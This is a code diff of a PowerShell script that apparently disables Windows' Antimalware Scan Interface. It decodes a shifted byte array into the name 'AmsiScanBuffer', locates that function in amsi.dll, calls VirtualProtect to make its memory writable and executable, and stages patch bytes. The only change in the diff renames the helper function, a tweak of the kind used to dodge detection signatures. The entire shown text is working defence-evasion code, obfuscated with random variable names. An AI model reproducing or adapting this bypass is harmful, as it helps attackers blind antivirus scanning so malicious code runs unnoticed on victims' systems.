@@ -1,4 +1,4 @@
-function candidate {
+function random {
  Param ($moduleName, $functionName)
  $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
  Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods');
@@ -30,9 +30,9 @@ $asdqwe = @(75,119,125,115,93,109,107,120,76,127,112,112,111,124)
 for($i=0;$i -lt $asdqwe.Length;$i++){
 	$asdqwe[$i]=$asdqwe[$i]-10
 }
-[IntPtr]$LGaudzvo99 = candidate amsi.dll $([System.Text.Encoding]::ASCII.getString($asdqwe));
+[IntPtr]$LGaudzvo99 = random amsi.dll $([System.Text.Encoding]::ASCII.getString($asdqwe));
 $HjmYfFIP99 = 0;
-$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((candidate kernel32.dll VirtualProtect),(fleck @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])));
+$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((random kernel32.dll VirtualProtect),(fleck @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])));
 $vp.Invoke($LGaudzvo99, 3, 0x40, [ref]$HjmYfFIP99);
 $buf = [Byte[]] (0xc2, 0x61, 0xa, 0x11, 0x8a, 0xcd);
 
